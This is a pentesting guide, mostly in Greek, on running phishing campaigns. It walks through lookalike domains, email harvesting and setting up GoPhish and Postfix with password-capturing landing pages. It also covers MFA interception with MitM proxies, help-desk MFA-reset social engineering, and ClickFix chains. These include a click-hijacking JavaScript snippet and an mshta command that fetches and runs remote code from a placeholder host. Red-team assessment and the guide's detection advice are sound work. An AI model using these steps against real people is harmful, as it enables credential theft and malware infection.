# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Recon το victim
1. Select the **victim domain**.
2. Κάνε κάποιο βασικό web enumeration **αναζητώντας login portals** που χρησιμοποιεί το victim και **αποφάσισε** ποιο θα **impersonate**.
3. Χρησιμοποίησε λίγο **OSINT** για να **βρεις emails**.
2. Προετοίμασε το περιβάλλον
1. **Αγόρασε το domain** που θα χρησιμοποιήσεις για το phishing assessment
2. **Configure τα records** της υπηρεσίας email (SPF, DMARC, DKIM, rDNS)
3. Configure το VPS με **gophish**
3. Προετοίμασε την καμπάνια
1. Προετοίμασε το **email template**
2. Προετοίμασε την **web page** για να κλέψεις τα credentials
4. Εκτόξευσε την καμπάνια!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: Το domain name **περιέχει** ένα σημαντικό **keyword** του αρχικού domain (e.g., zelster.com-management.com).
- **hypened subdomain**: Άλλαξε την **dot με hyphen** ενός subdomain (e.g., www-zelster.com).
- **New TLD**: Ίδιο domain χρησιμοποιώντας ένα **new TLD** (e.g., zelster.org)
- **Homoglyph**: **Αντικαθιστά** ένα γράμμα στο domain name με **γράμματα που μοιάζουν** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Ανταλλάσσει δύο γράμματα** μέσα στο domain name (e.g., zelsetr.com).
- **Singularization/Pluralization**: Προσθέτει ή αφαιρεί “s” στο τέλος του domain name (e.g., zeltsers.com).
- **Omission**: **Αφαιρεί ένα** από τα γράμματα του domain name (e.g., zelser.com).
- **Repetition:** **Επαναλαμβάνει ένα** από τα γράμματα στο domain name (e.g., zeltsser.com).
- **Replacement**: Like homoglyph but less stealthy. Αντικαθιστά ένα από τα γράμματα στο domain name, ίσως με ένα γράμμα κοντινό στο αρχικό στο πληκτρολόγιο (e.g, zektser.com).
- **Subdomained**: Εισάγει μια **dot** μέσα στο domain name (e.g., ze.lster.com).
- **Insertion**: **Εισάγει ένα γράμμα** στο domain name (e.g., zerltser.com).
- **Missing dot**: Πρόσθεσε το TLD στο domain name. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Υπάρχει μια **πιθανότητα ένα από κάποια bits που είναι αποθηκευμένα ή βρίσκονται σε επικοινωνία να αναστραφεί αυτόματα** λόγω διαφόρων παραγόντων όπως solar flares, cosmic rays, ή hardware errors.

Όταν αυτή η έννοια **εφαρμόζεται σε DNS requests**, είναι δυνατό το **domain που λαμβάνει ο DNS server** να μην είναι το ίδιο με το domain που ζητήθηκε αρχικά.

Για παράδειγμα, μια απλή τροποποίηση bit στο domain "windows.com" μπορεί να το αλλάξει σε "windnws.com."

Οι attackers μπορεί να **εκμεταλλευτούν αυτό** καταχωρώντας πολλαπλά bit-flipping domains** που είναι παρόμοια με το domain του victim. Η πρόθεσή τους είναι να ανακατευθύνουν legitimate users στη δική τους υποδομή.

Για περισσότερες πληροφορίες διάβασε [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Μπορείς να ψάξεις στο [https://www.expireddomains.net/](https://www.expireddomains.net) για ένα expired domain που θα μπορούσες να χρησιμοποιήσεις.\
Για να βεβαιωθείς ότι το expired domain που πρόκειται να αγοράσεις **έχει ήδη καλό SEO** μπορείς να δεις πώς κατηγοριοποιείται στα:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Για να **ανακαλύψεις περισσότερες** έγκυρες email addresses ή να **επαληθεύσεις αυτές που** έχεις ήδη βρει, μπορείς να ελέγξεις αν μπορείς να τις brute-force-άρεις στους smtp servers του victim. [Μάθε πώς να επαληθεύσεις/ανακαλύψεις email address εδώ](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Επιπλέον, μην ξεχάσεις ότι αν οι users χρησιμοποιούν **οποιοδήποτε web portal για να έχουν πρόσβαση στα mails τους**, μπορείς να ελέγξεις αν είναι vulnerable σε **username brute force**, και να εκμεταλλευτείς το vulnerability αν είναι δυνατό.

## Configuring GoPhish

### Installation

Μπορείς να το κατεβάσεις από [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Κατέβασέ το και αποσυμπίεσέ το μέσα στο `/opt/gophish` και εκτέλεσε `/opt/gophish/gophish`\
Θα σου δοθεί ένα password για τον admin user στην port 3333 στο output. Επομένως, κάνε access σε εκείνη την port και χρησιμοποίησε αυτά τα credentials για να αλλάξεις το admin password. Μπορεί να χρειαστεί να κάνεις tunnel εκείνη την port σε local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Ρύθμιση

**Ρύθμιση πιστοποιητικού TLS**

Πριν από αυτό το βήμα θα πρέπει να έχετε **ήδη αγοράσει το domain** που θα χρησιμοποιήσετε και πρέπει να **δείχνει** προς την **IP του VPS** όπου ρυθμίζετε το **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Ρύθμιση Mail**

Ξεκίνα την εγκατάσταση: `apt-get install postfix`

Έπειτα πρόσθεσε το domain στα ακόλουθα αρχεία:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Άλλαξε επίσης τις τιμές των ακόλουθων μεταβλητών μέσα στο /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Τέλος τροποποίησε τα αρχεία **`/etc/hostname`** και **`/etc/mailname`** με το domain name σου και **επανεκκίνησε το VPS σου.**

Τώρα, δημιούργησε ένα **DNS A record** του `mail.<domain>` που να δείχνει στην **ip address** του VPS και ένα **DNS MX** record που να δείχνει στο `mail.<domain>`

Τώρα ας δοκιμάσουμε να στείλουμε ένα email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Διαμόρφωση Gophish**

Σταματήστε την εκτέλεση του gophish και ας το διαμορφώσουμε.\
Τροποποιήστε το `/opt/gophish/config.json` ως εξής (σημειώστε τη χρήση του https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Ρύθμιση της υπηρεσίας gophish**

Για να δημιουργήσεις την υπηρεσία gophish ώστε να μπορεί να εκκινεί αυτόματα και να διαχειρίζεται ως υπηρεσία, μπορείς να δημιουργήσεις το αρχείο `/etc/init.d/gophish` με το ακόλουθο περιεχόμενο:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Ολοκληρώστε τη ρύθμιση της υπηρεσίας και ελέγξτε την κάνοντας:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Ρύθμιση mail server και domain

### Περίμενε & να είσαι legit

Όσο παλαιότερο είναι ένα domain, τόσο λιγότερο πιθανό είναι να εντοπιστεί ως spam. Επομένως, θα πρέπει να περιμένεις όσο το δυνατόν περισσότερο χρόνο (τουλάχιστον 1 week) πριν από το phishing assessment. Επιπλέον, αν βάλεις μια σελίδα για έναν reputational sector, η reputation που θα αποκτηθεί θα είναι καλύτερη.

Σημείωσε ότι ακόμη κι αν πρέπει να περιμένεις μία εβδομάδα, μπορείς να ολοκληρώσεις τώρα τη ρύθμιση όλων των υπόλοιπων.

### Ρύθμιση Reverse DNS (rDNS) record

Όρισε ένα rDNS (PTR) record που να επιλύει τη διεύθυνση IP του VPS στο domain name.

### Sender Policy Framework (SPF) Record

Πρέπει να **ρυθμίσεις ένα SPF record για το νέο domain**. Αν δεν ξέρεις τι είναι ένα SPF record [**διάβασε αυτή τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Μπορείς να χρησιμοποιήσεις το [https://www.spfwizard.net/](https://www.spfwizard.net) για να δημιουργήσεις το SPF policy σου (χρησιμοποίησε την IP του VPS machine)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

Αυτό είναι το περιεχόμενο που πρέπει να οριστεί μέσα σε ένα TXT record μέσα στο domain:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Εγγραφή Domain-based Message Authentication, Reporting & Conformance (DMARC)

Πρέπει να **ρυθμίσετε μια εγγραφή DMARC για το νέο domain**. Αν δεν ξέρετε τι είναι μια εγγραφή DMARC [**διαβάστε αυτή τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Πρέπει να δημιουργήσετε μια νέα εγγραφή DNS TXT που να δείχνει στο hostname `_dmarc.<domain>` με το ακόλουθο περιεχόμενο:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Πρέπει να **ρυθμίσετε ένα DKIM για το νέο domain**. Αν δεν ξέρετε τι είναι ένα DMARC record [**διαβάστε αυτή τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Αυτό το tutorial βασίζεται στο: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Πρέπει να συνενώσετε και τις δύο τιμές B64 που δημιουργεί το DKIM key:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Δοκιμάστε το σκορ της ρύθμισης email σας

Μπορείτε να το κάνετε χρησιμοποιώντας το [https://www.mail-tester.com/](https://www.mail-tester.com)\
Απλώς ανοίξτε τη σελίδα και στείλτε ένα email στη διεύθυνση που θα σας δώσουν:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Μπορείς επίσης να **ελέγξεις τη διαμόρφωση του email σου** στέλνοντας ένα email στο `check-auth@verifier.port25.com` και **διαβάζοντας την απάντηση** (για αυτό θα χρειαστεί να **ανοίξεις** την πόρτα **25** και να δεις την απάντηση στο αρχείο _/var/mail/root_ αν στείλεις το email ως root).\
Έλεγξε ότι περνάς όλα τα tests:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Θα μπορούσες επίσης να στείλεις **μήνυμα σε ένα Gmail υπό τον έλεγχό σου**, και να ελέγξεις τις **κεφαλίδες του email** στο inbox σου στο Gmail, το `dkim=pass` θα πρέπει να υπάρχει στο πεδίο κεφαλίδας `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

Η σελίδα [www.mail-tester.com](https://www.mail-tester.com) μπορεί να σου δείξει αν το domain σου μπλοκάρεται από spamhouse. Μπορείς να ζητήσεις την αφαίρεση του domain/IP σου στο: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​Μπορείς να ζητήσεις την αφαίρεση του domain/IP σου στο [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Όρισε κάποιο **όνομα για να αναγνωρίζεις** το sender profile
- Αποφάσισε από ποιο account θα στέλνεις τα phishing emails. Προτάσεις: _noreply, support, servicedesk, salesforce..._
- Μπορείς να αφήσεις κενά το username και το password, αλλά φρόντισε να έχεις επιλέξει το Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Συνιστάται να χρησιμοποιήσεις τη λειτουργία "**Send Test Email**" για να ελέγξεις ότι όλα λειτουργούν.\
> Θα πρότεινα να **στέλνεις τα test emails σε 10min mails addresses** ώστε να αποφεύγεις το blacklisting κατά τη διάρκεια των δοκιμών.

### Email Template

- Όρισε κάποιο **όνομα για να αναγνωρίζεις** το template
- Έπειτα γράψε ένα **subject** (τίποτα περίεργο, απλώς κάτι που θα περίμενες να δεις σε ένα κανονικό email)
- Βεβαιώσου ότι έχεις επιλέξει το "**Add Tracking Image**"
- Γράψε το **email template** (μπορείς να χρησιμοποιήσεις variables όπως στο ακόλουθο παράδειγμα):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Σημειώστε ότι **για να αυξήσετε την αξιοπιστία του email**, συνιστάται να χρησιμοποιήσετε κάποια signature από ένα email του client. Προτάσεις:

- Στείλτε ένα email σε μια **μη υπάρχουσα διεύθυνση** και ελέγξτε αν η απάντηση έχει κάποια signature.
- Αναζητήστε **δημόσια emails** όπως info@ex.com ή press@ex.com ή public@ex.com και στείλτε τους ένα email και περιμένετε την απάντηση.
- Προσπαθήστε να επικοινωνήσετε με κάποιο **έγκυρο email που ανακαλύφθηκε** και περιμένετε την απάντηση

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Το Email Template επίσης επιτρέπει να **επισυνάψετε αρχεία προς αποστολή**. Αν θέλετε επίσης να κλέψετε NTLM challenges χρησιμοποιώντας ειδικά διαμορφωμένα αρχεία/έγγραφα [διαβάστε αυτή τη σελίδα](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Δώστε ένα **όνομα**
- **Γράψτε τον HTML κώδικα** της ιστοσελίδας. Σημειώστε ότι μπορείτε να **εισάγετε** web pages.
- Επισημάνετε τα **Capture Submitted Data** και **Capture Passwords**
- Ορίστε ένα **redirection**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Συνήθως θα χρειαστεί να τροποποιήσετε τον HTML κώδικα της σελίδας και να κάνετε μερικά tests τοπικά (ίσως χρησιμοποιώντας κάποιο Apache server) **μέχρι να σας αρέσουν τα αποτελέσματα.** Στη συνέχεια, γράψτε αυτόν τον HTML κώδικα στο πλαίσιο.\
> Σημειώστε ότι αν χρειάζεται να **χρησιμοποιήσετε στατικούς πόρους** για το HTML (ίσως κάποιες σελίδες CSS και JS) μπορείτε να τους αποθηκεύσετε στο _**/opt/gophish/static/endpoint**_ και στη συνέχεια να τους προσπελάσετε από το _**/static/\<filename>**_

> [!TIP]
> Για το redirection θα μπορούσατε να **ανακατευθύνετε τους χρήστες στην νόμιμη κύρια web page** του θύματος, ή να τους ανακατευθύνετε στο _/static/migration.html_ για παράδειγμα, βάλτε κάποιο **spinning wheel (**[**https://loading.io/**](https://loading.io)**) για 5 δευτερόλεπτα και μετά υποδείξτε ότι η διαδικασία ήταν επιτυχής**.

### Users & Groups

- Ορίστε ένα όνομα
- **Εισάγετε τα δεδομένα** (σημειώστε ότι για να χρησιμοποιήσετε το template για το παράδειγμα χρειάζεστε το firstname, το last name και τη διεύθυνση email κάθε χρήστη)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Τέλος, δημιουργήστε μια campaign επιλέγοντας ένα όνομα, το email template, τη landing page, το URL, το sending profile και το group. Σημειώστε ότι το URL θα είναι ο σύνδεσμος που θα σταλεί στα θύματα

Σημειώστε ότι το **Sending Profile επιτρέπει να στείλετε ένα test email για να δείτε πώς θα φαίνεται το τελικό phishing email**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Θα συνιστούσα να **στείλετε τα test emails σε 10min mails addresses** ώστε να αποφύγετε το blacklisting κατά τη διάρκεια των tests.

Μόλις όλα είναι έτοιμα, απλώς ξεκινήστε την campaign!

## Website Cloning

Αν για οποιονδήποτε λόγο θέλετε να κάνετε clone το website, ελέγξτε την ακόλουθη σελίδα:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Σε ορισμένες phishing assessments (κυρίως για Red Teams) θα θέλετε επίσης να **στείλετε αρχεία που περιέχουν κάποιο είδος backdoor** (ίσως κάποιο C2 ή ίσως απλώς κάτι που θα ενεργοποιήσει ένα authentication).\
Δείτε την ακόλουθη σελίδα για μερικά παραδείγματα:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Η προηγούμενη επίθεση είναι αρκετά έξυπνη, καθώς πλαστογραφείτε ένα πραγματικό website και συλλέγετε τις πληροφορίες που εισάγει ο χρήστης. Δυστυχώς, αν ο χρήστης δεν έβαλε τον σωστό κωδικό ή αν η εφαρμογή που πλαστογραφήσατε είναι ρυθμισμένη με 2FA, **αυτές οι πληροφορίες δεν θα σας επιτρέψουν να υποδυθείτε τον εξαπατημένο χρήστη**.

Εδώ είναι χρήσιμα εργαλεία όπως [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) και [**muraena**](https://github.com/muraenateam/muraena). Αυτό το εργαλείο θα σας επιτρέψει να δημιουργήσετε μια επίθεση τύπου MitM. Βασικά, η επίθεση λειτουργεί με τον ακόλουθο τρόπο:

1. Υποδύεστε τη φόρμα **login** της πραγματικής ιστοσελίδας.
2. Ο χρήστης **στέλνει** τα **credentials** του στη ψεύτικη σελίδα σας και το εργαλείο τα στέλνει στην πραγματική ιστοσελίδα, **ελέγχοντας αν τα credentials λειτουργούν**.
3. Αν ο λογαριασμός είναι ρυθμισμένος με **2FA**, η σελίδα MitM θα το ζητήσει και, μόλις ο **χρήστης το εισαγάγει**, το εργαλείο θα το στείλει στην πραγματική web page.
4. Μόλις ο χρήστης πιστοποιηθεί, εσείς (ως attacker) θα έχετε **καταγράψει τα credentials, το 2FA, το cookie και κάθε πληροφορία** από κάθε αλληλεπίδραση, ενώ το εργαλείο εκτελεί ένα MitM.

### Via VNC

Τι γίνεται αν αντί να **στέλνετε το θύμα σε μια κακόβουλη σελίδα** με την ίδια εμφάνιση όπως η αρχική, το στείλετε σε μια **VNC session με έναν browser συνδεδεμένο στην πραγματική web page**; Θα μπορείτε να βλέπετε τι κάνει, να κλέψετε τον κωδικό, το MFA που χρησιμοποιείται, τα cookies...\
Μπορείτε να το κάνετε αυτό με το [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Προφανώς ένας από τους καλύτερους τρόπους για να ξέρετε αν σας ανακάλυψαν είναι να **αναζητήσετε το domain σας μέσα σε blacklists**. Αν εμφανίζεται στη λίστα, με κάποιον τρόπο το domain σας εντοπίστηκε ως ύποπτο.\
Ένας εύκολος τρόπος να ελέγξετε αν το domain σας εμφανίζεται σε κάποια blacklist είναι να χρησιμοποιήσετε το [https://malwareworld.com/](https://malwareworld.com)

Ωστόσο, υπάρχουν και άλλοι τρόποι για να ξέρετε αν το θύμα **αναζητά ενεργά ύποπτη phishing δραστηριότητα στο wild** όπως εξηγείται στο:


{{#ref}}
detecting-phising.md
{{#endref}}

Μπορείτε να **αγοράσετε ένα domain με πολύ παρόμοιο όνομα** με το domain του θύματος **και/ή να δημιουργήσετε ένα certificate** για ένα **subdomain** ενός domain που ελέγχετε εσείς **το οποίο περιέχει** το **keyword** του domain του θύματος. Αν το **θύμα** κάνει οποιουδήποτε είδους **DNS ή HTTP interaction** με αυτά, θα ξέρετε ότι **ψάχνει ενεργά** για ύποπτα domains και θα χρειαστεί να είστε πολύ stealth.

### Evaluate the phishing

Χρησιμοποιήστε το [**Phishious** ](https://github.com/Rices/Phishious)για να αξιολογήσετε αν το email σας θα καταλήξει στον spam φάκελο ή αν θα μπλοκαριστεί ή θα πετύχει.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Τα σύγχρονα intrusion sets παρακάμπτουν ολοένα και συχνότερα τα email lures και **στοχεύουν απευθείας τη ροή του service-desk / identity-recovery** για να νικήσουν το MFA.  Η επίθεση είναι πλήρως "living-off-the-land": μόλις ο operator αποκτήσει έγκυρα credentials, κάνει pivot με ενσωματωμένα admin tools – δεν απαιτείται malware.

### Attack flow
1. Recon το victim
* Συλλέξτε προσωπικά & εταιρικά στοιχεία από LinkedIn, data breaches, δημόσιο GitHub κ.λπ.
* Εντοπίστε high-value identities (executives, IT, finance) και καταγράψτε την **ακριβή διαδικασία help-desk** για password / MFA reset.
2. Real-time social engineering
* Καλέστε, Teams ή chat το help-desk υποδυόμενοι τον στόχο (συχνά με **spoofed caller-ID** ή **cloned voice**).
* Δώστε τα προηγουμένως συλλεγμένα PII για να περάσετε knowledge-based verification.
* Πείστε τον agent να **reset το MFA secret** ή να κάνει **SIM-swap** σε καταχωρισμένο κινητό αριθμό.
3. Immediate post-access actions (≤60 min in real cases)
* Εξασφαλίστε foothold μέσω οποιασδήποτε web SSO portal.
* Καταγράψτε AD / AzureAD με built-ins (δεν ρίχνονται binaries):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement με **WMI**, **PsExec**, ή νόμιμους **RMM** agents που είναι ήδη whitelisted στο περιβάλλον.

### Detection & Mitigation
* Αντιμετωπίστε το help-desk identity recovery ως **privileged operation** – απαιτήστε step-up auth & έγκριση manager.
* Εφαρμόστε κανόνες **Identity Threat Detection & Response (ITDR)** / **UEBA** που ειδοποιούν για:
* Αλλαγή MFA method + authentication από νέο device / geo.
* Άμεση elevation του ίδιου principal (user-→-admin).
* Καταγράψτε τις help-desk κλήσεις και επιβάλετε ένα **call-back σε ήδη εγγεγραμμένο αριθμό** πριν από οποιοδήποτε reset.
* Εφαρμόστε **Just-In-Time (JIT) / Privileged Access** ώστε οι λογαριασμοί που μόλις έκαναν reset να **μην** κληρονομούν αυτόματα high-privilege tokens.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews αντισταθμίζουν το κόστος των high-touch ops με mass attacks που μετατρέπουν τις **μηχανές αναζήτησης & τα ad networks σε κανάλι διανομής**.

1. Το **SEO poisoning / malvertising** προωθεί ένα ψεύτικο αποτέλεσμα όπως `chromium-update[.]site` στην κορυφή των search ads.
2. Το θύμα κατεβάζει έναν μικρό **first-stage loader** (συχνά JS/HTA/ISO).  Παραδείγματα που είδε η Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Ο loader εξάγει browser cookies + credential DBs, και μετά φορτώνει έναν **silent loader** που αποφασίζει – *σε realtime* – αν θα αναπτύξει:
* RAT (e.g. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Μπλοκάρετε newly-registered domains & επιβάλετε **Advanced DNS / URL Filtering** σε *search-ads* καθώς και στο e-mail.
* Περιορίστε την εγκατάσταση software σε signed MSI / Store packages, απαγορεύστε την εκτέλεση `HTA`, `ISO`, `VBS` μέσω policy.
* Παρακολουθείτε για child processes browsers που ανοίγουν installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Κάντε hunt για LOLBins που καταχρώνται συχνά από first-stage loaders (e.g. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Ορισμένα fake software portals κρατούν το ορατό download `href` να δείχνει στο **πραγματικό** GitHub/release URL αλλά hijack την **πρώτη** αλληλεπίδραση του χρήστη στο JavaScript και στέλνουν το θύμα σε μια αλυσίδα **Traffic Distribution System (TDS)** αντί γι’ αυτό.
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Χαρακτηριστικά:
- Το hook συνήθως τρέχει στη **capture phase** (`true`) στο `document`, οπότε ενεργοποιείται πριν από τα site handlers.
- Το Chrome συχνά χρησιμοποιεί `mousedown` αντί για `click` για να κρατήσει το redirect δεμένο σε ένα έγκυρο **user gesture** και να βελτιώσει το bypass του popup-blocker.
- Ορισμένα variants προανοίγουν `about:blank` ή συνθέτουν `<a target="_blank">` clicks και μόνο αργότερα αποδίδουν το TDS URL.
- Τα browser-side caps συνήθως βρίσκονται σε `localStorage`, οπότε το **first click** μπορεί να φτάσει στο malware ενώ τα refreshes/retries επιστρέφουν στο benign-looking visible link.
- Το TDS μπορεί να κάνει gate με referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter checks, click context, και per-session counters, κάνοντας τα analyst replays μη ντετερμινιστικά.

Ιδέες για defenders:
- Σύγκρινε το **displayed** `href` με το **actual** navigation target που παράγεται στο click time.
- Ψάξε για `document.addEventListener(..., true)` handlers που καλούν και `preventDefault()` και `stopImmediatePropagation()` γύρω από `window.open`, `about:blank`, ή synthetic anchor clicks.
- Αντιμετώπισε clusters από newly registered software-download domains που όλα φορτώνουν το ίδιο CloudFront/JS stage ως υψηλού σήματος pattern SEO-poisoning/TDS.

### ClickFix from fake verification pages + archive-looking LOLBAS fetches
Κάποια TDS branches καταλήγουν σε fake verification page (Cloudflare/IUAM style) που λέει στο θύμα να εκτελέσει ένα trusted Windows binary όπως:
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Σημειώσεις:
- Το `mshta.exe` εκτελεί το **HTA/VBScript στην αρχή της απόκρισης**, ακόμα κι αν το URL προσποιείται ότι είναι `.7z` αρχείο· τα προσαρτημένα δεδομένα αρχείου μπορούν να είναι καθαρό δόλωμα.
- Τα επόμενα στάδια συχνά συνεχίζουν να λένε ψέματα για τον τύπο αρχείου (`.rtf` για PowerShell, `.asar` για Python, ZIPs με padded binaries) και μετά αλλάζουν σε **manual PE mapping / in-memory execution**.
